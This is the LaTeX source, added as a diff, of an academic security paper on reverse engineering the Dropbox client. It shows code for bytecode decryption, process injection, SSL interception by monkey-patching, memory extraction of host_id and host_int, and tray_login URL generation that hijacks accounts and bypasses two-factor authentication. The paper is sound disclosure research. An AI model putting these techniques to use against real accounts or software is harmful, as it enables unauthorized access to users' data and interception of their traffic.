@@ -1,0 +1,663 @@
+\documentclass[letterpaper,twocolumn,10pt]{article}
+\usepackage{usenix,epsfig}
+\usepackage{usenix,epsfig,endnotes}
+\usepackage{ucs}
+\usepackage{minted}
+\usepackage{hyperref}
+\usepackage{listings}
+\lstset{language=Python}
+\usepackage{url}
+\usepackage[utf8x]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[hyphenbreaks]{breakurl}
+\usepackage{ragged2e}
+\setlength\partopsep{-\topsep}
+\addtolength\partopsep{-\parskip}
+\lstnewenvironment{code}[1][] {
+   \noindent
+   \minipage{\linewidth}
+   \vspace{0.05\baselineskip}
+   \lstset{basicstyle=\ttfamily\footnotesize,
+   showspaces=false,showstringspaces=false,frame=single,#1}}
+{\endminipage}
+\newcommand*\wrapletters[1]{\wr@pletters#1\@nil}
+\def\wr@pletters#1#2\@nil{#1\allowbreak\if&#2&\else\wr@pletters#2\@nil\fi}
+\begin{document}
+
+%don't want date printed
+\date{}
+
+%make title bold and 14 pt font (Latex default is non-bold, 16 pt)
+\title{\Large \bf Looking inside the (Drop) box}
+
+\author{ {\rm Dhiru Kholia}\\ Openwall / University of British Columbia \\
+{\rm dhiru@openwall.com} \and {\rm Przemysław Węgrzyn}\\ CodePainters \\ {\rm
+wegrzyn@codepainters.com} }
+
+\maketitle
+
+% Use the following at camera-ready time to suppress page numbers. Comment it
+% out when you first submit the paper for review.
+\pagestyle{empty}
+
+\subsection*{Abstract}
+
+Dropbox is a cloud based file storage service used by more than 100 million
+users. In spite of its widespread popularity, we believe that Dropbox as a
+platform hasn't been analyzed extensively enough from a security standpoint.
+Also, the previous work on the security analysis of Dropbox has been heavily
+censored. Moreover, the existing Python bytecode reversing techniques are not
+enough for reversing \emph{hardened} applications like Dropbox.
+
+This paper presents new and generic techniques, to reverse engineer
+\emph{frozen} Python applications, which are not limited to just the Dropbox
+world. We describe a method to bypass Dropbox's two factor authentication and
+hijack Dropbox accounts. Additionally, generic techniques to intercept SSL data
+using code injection techniques and \emph{monkey patching} are presented.
+
+We believe that our biggest contribution is to open up the Dropbox platform to
+further security analysis and research. Dropbox will / should no longer be a
+black box. Finally, we describe the design and implementation of an open-source
+version of Dropbox client (and yes, it runs on ARM too).
+
+\section{Introduction}
+
+The Dropbox clients run on around ten platforms and many of these Dropbox
+clients are written mostly in Python~\cite{DropboxPyCon11}. The client consists
+of a modified Python interpreter running obfuscated Python bytecode. However,
+Dropbox being a proprietary platform, no source code is available for these
+clients. Moreover, the API being used by the various Dropbox clients is not
+documented.
+
+Before trusting our data to Dropbox, it would be wise (in our opinion) to know
+more about the internals of Dropbox. Questions about the security of the
+uploading process, two-factor authentication and data encryption are some of
+the most obvious.
+
+Our paper attempts to answer these questions and more. In this paper, we show
+how to unpack, decrypt and decompile Dropbox from scratch and in full detail.
+This paper presents new and generic techniques to reverse engineer frozen Python
+applications. Once you have the decompiled source-code, it is possible to study
+how Dropbox works in detail. This Dropbox source-code reversing step is the
+foundation of this paper and is described in section~\ref{sec:breaking}.
+
+Our work uses various code injection techniques and monkey-patching to
+intercept SSL data in Dropbox client. We have used these techniques
+successfully to snoop on SSL data in other commercial products as well. These
+techniques are generic enough and we believe would aid in future software
+development, testing and security research.
+
+Our work reveals the internal API used by Dropbox client and makes it
+straightforward to write a portable open-source Dropbox client, which we
+present in section~\ref{sec:internals}. Ettercap and Metasploit plug-ins (for
+observing \emph{LAN sync} protocol and account hijacking, respectively) are
+presented which break various security aspects of Dropbox. Additionally, we
+show how to bypass Dropbox's two factor authentication and gain access to
+user's data.
+
+We hope that our work inspires the security community to write an open-source
+Dropbox client, refine the techniques presented in this paper and conduct
+research into other cloud based storage systems.
+
+\section{Existing Work}
+
+In this section, we cover existing work related to security analysis of Dropbox
+and analyze previously published reversing techniques for Python applications.
+
+\emph{Critical Analysis of Dropbox Software Security}~\cite{nicolas2012}
+analyzes Dropbox versions from 1.1.x to 1.5.x. However, the techniques
+presented in this paper are not generic enough to deal with the changing
+bytecode encryption methods employed in Dropbox and in fact, fail to work for
+Dropbox versions >= 1.6. Another tool called \emph{dropboxdec, Dropbox Bytecode
+Decryption Tool}~\cite{dropboxdec} fails to work since it only can deal with
+encryption algorithm used in the earlier versions (1.1.x) of Dropbox. Our work
+bypasses the bytecode decryption step entirely and is more robust against the
+ever changing encryption methods employed in Dropbox.
+
+The techniques presented in \emph{pyREtic}~\cite{smith2010} do not work against
+Dropbox since \emph{co\_code} (code object attribute which contains bytecode)
+cannot be accessed any more at the Python layer. Furthermore, the key technique
+used by pyREtic (replacing original obfuscated \emph{.pyc} bytecode file with
+desired .py file) to gain control over execution no longer works. Dropbox
+patches the standard import functionality which renders pyREtic's key technique
+useless. We get around this problem by using standard and well-understood code
+injection techniques like Reflective DLL injection~\cite{fewer2008reflective}
+(on Windows) and LD\_PRELOAD~\cite{LDPRELOAD} (on Linux). \emph{marshal.dumps}
+function which could be potentially used for dumping bytecode is patched too!
+Also, techniques described in \emph{Reverse Engineering Python
+Applications}~\cite{portnoy2008reverse} do not work against Dropbox for the
+very same reasons. We work around this problem by dynamically finding the
+co\_code attribute at the C layer. In short, Dropbox is challenging to reverse
+and existing techniques fail.
+
+Another interesting attack on the older versions of Dropbox is implemented in
+the dropship tool~\cite{Dropship}. Essentially dropship allows a user to gain
+access to files which the user doesn't own provided the user has the correct
+cryptographic hashes of the desired files. However, Dropbox has patched this
+attack vector and we have not been able to find similar attacks yet.
+
+\section{Breaking the (Drop)box}
+\label{sec:breaking}
+
+In this section we explain various ways to reverse-engineer Dropbox application
+on Windows and Linux platform. We have analyzed Dropbox versions from 1.1.x to
+2.3.19 (latest as of 23-July-2013).
+
+Dropbox clients for Linux, Windows and Mac OS are written mostly in Python. On
+Windows, \emph{py2exe}~\cite{py2exe} is used for packaging the source-code and
+generating the deliverable application. A heavily \emph{fortified} version of
+the Python interpreter can be extracted from the PE resources of Dropbox.exe
+executable using tools like PE Explorer or Resource Hacker. Dropbox.exe also
+contains a ZIP of all encrypted .pyc files containing obfuscated bytecode.
+
+On Linux, Dropbox is packaged (most likely) using the \emph{bbfreeze}
+utility~\cite{bbfreeze}. bbfreeze uses static linking (for Python interpreter
+and the OpenSSL library) and as such there is no shared library which can be
+extracted out and analyzed in a debugger or a disassembler.
+
+\subsection{Unpacking Dropbox}
+
+A generic unpacker for Dropbox.exe executable (dropbox / main on Linux) is
+trivial to write,
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
+import zipfile
+from zipfile import PyZipFile
+
+fileName = "Dropbox.exe"
+mode = "r"
+ztype = zipfile.ZIP_DEFLATED
+
+f = PyZipFile(fileName, "r", ztype)
+f.extractall("bytecode_encrypted")
+\end{minted}
+
+This script will extract the encrypted .pyc files (which contain bytecode) in a
+folder called \emph{bytecode\_encrypted}. Normally, .pyc files contain a
+four-byte magic number, a four-byte modification timestamp and a marshalled
+code object~\cite{nedbatchelder}. In case of Dropbox, the marshalled code
+object is encrypted. In the next section, we describe various techniques to
+decrypt these encrypted .pyc files.
+
+\subsection{Decrypting encrypted Dropbox bytecode}
+
+As briefly mentioned earlier, we extract the customized Python interpreter
+named Python27.dll from the PE resources of Dropbox.exe executable using PE
+Explorer. This Python27.dll file from the Windows version of Dropbox was
+analyzed using IDA Pro and BinDiff to see how it is different from the standard
+interpreter DLL. We found out that many standard functions like PyRun\_File(),
+marshal.dumps are nop'ed out to make reverse engineering Dropbox harder.
+
+A casual inspection of extracted .pyc files reveals no visible strings which is
+not the case with standard .pyc files. This implies that encryption (or some
+obfuscation) is being employed by Dropbox to protect bytecode. We found that
+Python’s r\_object() (in marshal.c) function was patched to decrypt code
+objects upon loading. Additionally, Dropbox's .pyc files use a non-standard
+magic number (4 bytes), this however is trivial to fix. To decrypt the buffer
+r\_object() calls a separate function inside Python27.dll. We figured out a way
+to call this decryption function from outside the DLL and then consequently
+dump the decrypted bytecode back to disk. There is no need at all to analyse
+the encryption algorithm, keys, etc. However we had to rely on calling a
+hard-coded address and this decryption function has no symbol attached.
+Additionally, On Linux, everything is statically linked into a single binary
+and the decryption function is inlined into r\_object(). So, we can no longer
+call this decryption function in a standalone fashion.
+
+To overcome this problem, we looked around for a more robust approach and hit
+upon the idea of loading the .pyc files into memory from the disk and then
+serializing them back. We use LD\_PRELOAD (Reflective DLL injection on Windows)
+to inject our C code into dropbox process, then we override (hijack) a common C
+function (like strlen) to gain control over the control flow and finally we
+inject Python code by calling PyRun\_SimpleString (official Python C API
+function which is not patched!). Hence it is possible to execute arbitrary
+code in Dropbox client context.
+
+We should mention that running Python code from within the injected code in
+Dropbox context requires GIL (Global Interpreter Lock)~\cite{GIL} to be
+acquired.
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{c}
+// use dlsym(RTLD_DEFAULT...) to find
+// symbols from within the injected code
+
+PyGILState_STATE gstate;
+gstate = PyGILState_Ensure();
+PyRun_SimpleString("print 'w00t!'");
+\end{minted}
+
+Now we explain how we get Dropbox to do the decryption work for us and for
+free. From the injected code we can call
+\emph{PyMarshal\_ReadLastObjectFromFile()} which loads the code object from
+encrypted .pyc file. So, in memory we essentially have unencrypted code object
+available. However, the co\_code string (which contains the bytecode
+instructions) is not exposed at the Python layer (this can be done by modifying
+code\_memberlist array in Objects/codeobject.c file). So after locating this
+decrypted code object (using a linear memory search) we serialize it back to
+file. However this again is not straightforward since marshal.dumps method is
+nop'ed. In other words, object marshalling is stripped out in the custom
+version of Python used by Dropbox.  So, we resort to using PyPy’s
+\_marshal.py~\cite{PyPy} which we inject into the running Dropbox process.
+
+Dropbox keeps changing the bytecode encryption scheme. In Dropbox 1.1.x, TEA
+cipher, along with an RNG seeded by some values embedded in the code object of
+each python module, is used to perform bytecode encryption~\cite{dropboxdec}.
+In Dropbox 1.1.45 this RNG function was changed and this broke
+dropboxdec~\cite{dropboxdec} utility. ~\cite{nicolas2012} runs into similar
+problems as well. In short, these changing bytecode encryption schemes used by
+Dropbox are quite effective against older reversing approaches. In contrast,
+our reversing techniques are not affected by such changes at all.
+
+In summary, we get decryption for free! Our method is a lot shorter, easier and
+more reliable than the ones used in~\cite{dropboxdec} and~\cite{nicolas2012}. Overall,
+we have 200 lines of C and 350 lines of Python (including marshal code from PyPy).
+Our method is robust, as we do not even need to deal with the ever changing
+decryption algorithms ourselves. Our decryption tool works with all versions of
+Dropbox that we used for testing. Finally, the techniques described in this
+section are generic enough and also work for reversing other frozen Python
+applications (e.g. Druva inSync and Google Drive Insync client).
+
+\subsection{Opcode remapping}
+
+The next anti-reversing technique used by Dropbox is Opcode remapping. The
+decrypted .pyc files have valid strings (which are expected in standard Python
+byte-code), but these .pyc files still fail to load under standard interpreter
+due to opcodes being swapped.
+
+CPython is a simple opcode (1 byte long) interpreter. ceval.c is mostly a big
+switch statement inside a loop which evaluates these opcodes. In Dropbox, this
+part is patched to use different opcode values. We were able to recover this
+mapping manually by comparing disassembled DLL with ceval.c (standard CPython
+file). However, this process is time consuming and won't really scale if
+Dropbox decided to use even slightly different opcode mapping in the newer
+versions.
+
+A technique to break this protection is described in pyREtic~\cite{smith2010}
+paper and is partially used in dropboxdec~\cite{dropboxdec}. In short, Dropbox
+bytecode is compared against standard Python bytecode for common modules.
+It does not work (as it is) against Dropbox because co\_code (bytecode string)
+is not available at the Python layer and Python import has been patched in
+order to not load .py files. However, it is possible to compare decrypted
+Dropbox bytecode (obtained using our method) with standard bytecode for common
+Python modules and come up with opcode mapping used by Dropbox.
+
+However, we used an alternative new technique for recovering opcode mapping
+which is more effective. We make use of the low-level import functionality
+present in Dropbox to import a specially crafted Python source file. This
+Python source file \emph{exercises} all the possible opcodes. After the import
+is done, we dump the obfuscated bytecode back to the disk. Once this is done,
+the obfuscated bytecode is compared with the standard interpreter's bytecode
+(for the very same specially crafted Python source file) and the mapping is
+subsequently recovered.
+
+In practice, the opcode mapping employed in Dropbox hasn't changed since
+version 1.6.0. In the next section, we describe how to decompile the recovered
+.pyc files.
+
+\subsection{Decompiling decrypted bytecode}
+
+For decompiling decrypted Python bytecode to Python source code we rely on
+uncompyle2~\cite{uncompyle2}, which is a Python 2.7 byte-code decompiler,
+written in Python 2.7.
+
+uncompyle2 is straightforward to use and the decompiled source code works fine.
+We were able to recover all the Python source code used in Dropbox with
+uncompyle2.
+
+In the next section, we analyse how Dropbox authentication works and then
+present some attacks against it.
+
+\section{Dropbox security and attacks}
+
+Accessing Dropbox's website requires one to have the necessary credentials
+(email address and password). The same credentials are also required in order
+to link (register) a device with a Dropbox account. In this registration
+process, the end-user device is associated with a unique \emph{host\_id} which
+is used for all future authentication operations. In other words, Dropbox
+client doesn't store or use user credentials once it has been linked to the
+user account. host\_id is not affected by password changes and it is stored
+locally on the end-user device.
+
+In older versions (< 1.2.48) of Dropbox, this host\_id was stored locally in
+clear-text in an \emph{SQLite} database (named
+\emph{config.db}). By simply copying this SQLite database file to another
+machine, it was possible to gain access to the target user's data. This attack
+vector is described in detail in the "Dropbox authentication: insecure by design"
+post~\cite{derek2011}.
+
+However, from version 1.2.48 onwards, host\_id is now stored in an encrypted
+local SQLite database~\cite{sqlite-dbx}. However, host\_id can still be
+extracted from the encrypted SQLite database
+(\emph{\$HOME/.dropbox/config.dbx}) since the \emph{secrets} (various inputs)
+used in deriving the database encryption key are stored on the end-user device
+(however, local storage of such secrets can't be avoided since Dropbox client
+depends on them to work). On Windows, DPAPI encryption is used to protect the
+secrets whereas on Linux a custom obfuscator is used by Dropbox. It is
+straightforward to discover where the secrets are stored and how the database
+encryption key is derived. The relevant code for doing so on Linux is in
+\emph{common\_util/keystore/keystore\_linux.py} file.
+dbx-keygen-linux~\cite{dbx-keygen-linux} (which uses reversed Dropbox sources)
+is also capable of recovering the database encryption key. It also works for
+decrypting \emph{filecache.dbx} encrypted database which contains meta-data
+and which could be useful for forensic purposes.
+
+Additionally, another value \emph{host\_int} in now involved in the
+authentication process. After analyzing Dropbox traffic, we found out that
+\emph{host\_int} is received from the server at startup and also that it does
+not change.
+
+\subsection{host\_id and host\_int}
+Dropbox client has a handy feature which enables a user to login to Dropbox's
+website without providing any credentials. This is done by selecting "Launch
+Dropbox Website" from the Dropbox tray icon. So, how exactly does the Dropbox
+client accomplish this? Well, two values, host\_id and host\_int are involved
+in this process. In fact, knowing host\_id and host\_int values that are being
+used by a Dropbox client is enough to access all data from that particular
+Dropbox account. host\_id can be extracted from the encrypted SQLite database
+or from the target's memory using various code injection techniques.
+
+host\_int can be sniffed from Dropbox LAN sync protocol traffic. While this
+protocol can be disabled, it is turned on by default. We have written an
+Ettercap plug-in~\cite{ettercap} to sniff the host\_int value remotely on a
+LAN. It is also possible to extract this value from the target machine's
+memory.
+
+We found an interesting attack on Dropbox versions (<= 1.6.x) in which it was
+possible to extract the host\_id and host\_int values from the logs generated
+by the Dropbox client. However the Dropbox client generated these logs only when
+a special environment variable (DBDEV) was set properly. Dropbox turns on logging
+only when the MD5 checksum of DBDEV starts with "c3da6009e4". James Hall from the
+\#openwall channel was able to crack this partial MD5 hash and he found out that the
+string "a2y6shya" generates the required partial MD5 collision. Our Metasploit
+plug-in~\cite{metasploit} exploits this "property" and is able to remotely
+hijack Dropbox accounts. This property has been patched after we disclosed
+it responsibly to Dropbox. However, the next section will describe a new way
+of hijacking Dropbox accounts which cannot be patched easily.
+
+We mentioned earlier that the host\_int value is received from the server at
+startup and that it does not change. So, it is obviously possible to ask the
+Dropbox server itself for this value, just like the Dropbox client does!
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
+import json
+import requests
+
+host_id = <UNKNOWN>
+
+data = ("buildno=Dropbox-win-1.7.5&tag="
+        "&uuid=123456&server_list=True&"
+	"host_id=%s&hostname=random"
+	% host_id)
+
+base_url = 'https://client10.dropbox.com'
+url = base_url + '/register_host'
+
+headers = {'content-type': \
+   'application/x-www-form-urlencoded', \
+   'User-Agent': "Dropbox ARM" }
+
+r = requests.post(url, data=data,
+    headers=headers)
+
+data = json.loads(r.text)
+host_int = data["host_int"]
+\end{minted}
+
+\subsection{Hijacking Dropbox accounts}
+
+Once, host\_int and host\_id values for a particular Dropbox client are known,
+it is possible to gain access to that account using the following code. We call
+this the \emph{tray\_login} method.
+
+% XXX ugly hack
+\vspace{15mm}
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
+import hashlib
+import time
+
+host_id = <UNKNOWN>
+host_int = <ASK SERVER>
+
+now = int(time.time())
+
+fixed_secret = 'sKeevie4jeeVie9bEen5baRFin9'
+
+h = hashlib.sha1('%s%s%d'% (fixed_secret,
+    host_id, now)).hexdigest()
+
+url = ("https://www.dropbox.com/tray_login?"
+       "i=%d&t=%d&v=%s&url=home&cl=en" %
+       (host_int, now, h))
+
+\end{minted}
+
+Accessing the \emph{url} output of the above code takes one to the Dropbox
+account of the target user. We have shown (in the previous section) a method to
+get the host\_int value from the Dropbox server itself. So, in short, we have
+\emph{revived} the earlier attack (which was fixed by Dropbox) on Dropbox
+accounts which required knowing only the host\_id value to access the target's
+Dropbox account.
+
+While this new technique for hijacking Dropbox accounts works fine currently,
+we have observed that the latest versions of Dropbox client do not use this
+\emph{tray\_login} mechanism (in order to allow the user to automatically login
+to the website). They now rely on heavier obfuscation and random \emph{nonces}
+(received from the server) to generate those auto-login URLs. We plan to
+\emph{break} this new auto-login mechanism in the near future.
+
+\section{Intercepting SSL data}
+\label{sec:internals}
+In previous code samples, we have used undocumented Dropbox API. In this
+section we describe how we discovered this internal API. Existing SSL MiTM
+(man-in-the-middle) tools (e.g. Burp Suite) cannot sniff Dropbox traffic since
+Dropbox client uses hard coded SSL certificates. Additionally the OpenSSL
+library is statically linked with Dropbox executable. Binary patching is
+somewhat hard and time-consuming. We get around this problem by using
+Reflective DLL injection~\cite{fewer2008reflective} (on Windows) and
+LD\_PRELOAD~\cite{LDPRELOAD} on Linux) to gain control over execution, followed
+by monkey patching~\cite{monkey} of all "interesting" objects.
+
+Once we are able to execute arbitrary code in Dropbox client context, we patch
+all \emph{SSL objects} and are able to snoop on the data before it has been encrypted
+(on sending side) and after it has been decrypted (on receiving side). This is
+how we intercept SSL data. We have successfully used the same technique on
+multiple commercial Python applications (e.g. Druva inSync). The following code
+shows how we locate and patch interesting Python objects at runtime.
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
+import gc
+
+f = open("SSL-data.txt", "w")
+
+def ssl_read(*args):
+    data = ssl_read_saved(*args)
+    f.write(str(data))
+    return data
+
+def patch_object(obj):
+    if isinstance(obj, SSLSocket) \
+      and not hasattr(obj, "marked"):
+        obj.marked = True
+        ssl_read_saved = obj.read
+        obj.read = ssl_read
+
+while True:
+    objs = gc.get_objects()
+
+    for obj in objs:
+        patch_object(obj)
+
+    time.sleep(1)
+\end{minted}
+
+This monkey patching technique to intercept SSL data can also be used with
+other dynamic languages like Ruby, Perl, JavaScript, Perl and Groovy.
+
+\subsection{Bypassing 2FA}
+
+We found that two-factor authentication (as used by Dropbox) only protects
+against unauthorized access to the Dropbox's website. The Dropbox internal
+client API does not support or use two-factor authentication! This implies
+that it is sufficient to have only the host\_id value to gain access to
+the target's data stored in Dropbox.
+
+Furthermore, we can \emph{inject} this host\_id value into a Dropbox client and
+then, use the client's tray\_login (auto-login) feature to gain access to the
+Dropbox's website.
+
+In summary, we have demonstrated that the whole security of the Dropbox
+eco-system relies on a single 32-byte value, namely the host\_id.
+
+\subsection{Open-source Dropbox client}
+
+Based on the findings of the earlier sections, it is straightforward to write
+an open-source Dropbox client. The following code snippet shows how to fetch
+the list of files stored in a Dropbox account.
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
+
+host_id = "?"
+
+BASE_URL = 'https://client10.dropbox.com/'
+register_url = BASE_URL + 'register_host'
+list_url = BASE_URL + "list"
+
+# headers
+headers = {'content-type': \
+   'application/x-www-form-urlencoded', \
+   'User-Agent': "Dropbox ARM" }
+
+# message
+data = ("buildno=ARM&tag=&uuid=42&"
+   "server_list=True&host_id=%s"
+   "&hostname=r" % host_id)
+
+r = requests.post(register_url,
+   data=data, headers=headers)
+
+# extract data
+data = json.loads(r.text)
+host_int = data["host_int"]
+root_ns = data["root_ns"]
+
+# fetch data list
+root_ns = str(root_ns) + "_-1"
+
+data = data + ("&ns_map=%s&dict_return=1"
+   "&server_list=True&last_cu_id=-1&"
+   "need_sandboxes=0&xattrs=True"
+   % root_ns)
+
+# fetch list of files
+r = requests.post(list_url,
+   data=data, headers=headers)
+
+data = json.loads(r.text)
+paths = data["list"]
+
+# show a list of files and their hashes
+print paths
+
+\end{minted}
+
+Similarly, we are able to upload and update files using our open-source Dropbox
+client. We hope that our work inspires the open-source community to write a
+full-fledged open-source Dropbox client capable of running even on platforms
+not supported by Dropbox.
+
+\subsection{New ways to hijack accounts}
+
+We have briefly mentioned previously that it is possible to extract host\_id
+and host\_int from the Dropbox client's memory once control of execution flow
+has been gained by using Reflective DLL injection or LD\_PRELOAD. The following
+code snippet shows how exactly this can be accomplished.
+
+\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{c}
+# 1. Inject code into Dropbox.
+# 2. Locate PyRun_SimpleString using dlsym
+#    from within the Dropbox process
+# 3. Feed the following code to the located
+#    PyRun_SimpleString
+
+import gc
+
+objs = gc.get_objects()
+for obj in objs:
+    if hasattr(obj, "host_id"):
+        print obj.host_id
+    if hasattr(obj, "host_int"):
+        print obj.host_int
+
+\end{minted}
+
+We believe that this technique (snooping on objects) is hard to protect
+against. Even if Dropbox somehow prevents attackers from gaining control over
+the execution flow, it is still possible to use smart \emph{memory snooping}
+attacks as implemented in passe-partout~\cite{passe-partout}. We plan to extend
+passe-partout to carry out more generic \emph{memory snooping} attacks in the
+near future.
+
+\section{Mitigations}
+
+We believe that the \emph{arms race} between software protection and software
+reverse engineering would go on. Protecting software against reverse
+engineering is hard but it is definitely possible to make the process
+of reverse engineering even harder.
+
+Dropbox uses various techniques to deter reverse engineering like changing
+bytecode magic number, bytecode encryption, opcode remapping, disabling
+functions which could aid reversing, static linking, using hard coded
+certificates and hiding raw bytecode objects. We think that all these
+techniques are good enough against a casual attacker. Additionally, Dropbox
+could use techniques like function name mangling, marshalling
+format changes to make reverse engineering harder.
+
+That being said, we wonder what Dropbox aims to gain by employing such
+anti-reversing measures. Most of the Dropbox's "secret sauce" is on the
+server side which is already well protected. We do not believe that these
+anti-RE measures are beneficial for Dropbox users and for Dropbox.
+
+\section{Challenges and future work}
+
+The various things we would like to explore are finding automated techniques
+for reversing opcode mappings and discovering new attacks on the LAN sync
+protocol used by Dropbox.
+
+Activating logging in Dropbox now requires cracking a full SHA-256 hash
+(\wrapletters{e27eae61e774b19f4053361e523c771a92e838026da42c60e6b097d9cb2bc825}).
+The plaintext corresponding to this hash needs to be externally supplied to
+the Dropbox client (in order to activate logging) and this plaintext value is
+not public.
+
+Another interesting challenge is to run Dropbox back from its decompiled
+sources. We have been partially successful (so far) in doing so. We would like
+to work on making the technique of dumping bytecode from memory (described in
+the pyREtic~\cite{smith2010} paper) work for Dropbox.
+
+At some point, Dropbox service will disable the existing "tray\_login" method
+which will make hijacking accounts harder. Therefore, we would like to continue
+our work on finding new ways to do it.
+
+\section{Acknowledgments}
+
+We would like to thank Nicolas Ruff, Florian Ledoux and wibiti for their work
+on uncompyle2. We also thank the anonymous reviewers as well as other Openwall
+folks for their helpful comments and feedback.
+
+\section{Availability}
+
+Our and other tools used by us are available on GitHub at
+\url{https://github.com/kholia}. Python decompiler is available
+at~\cite{uncompyle2} and the code for Reflective DLL Injection is available
+at~\cite{reflective}. We also plan to publish the complete source code of our
+tools and exploits on GitHub around conference time.
+
+\begingroup
+\raggedright
+{\footnotesize \bibliographystyle{acm}
+\sloppy
+\bibliography{WOOT13-dropbox}}
+\endgroup
+
+\end{document}
+
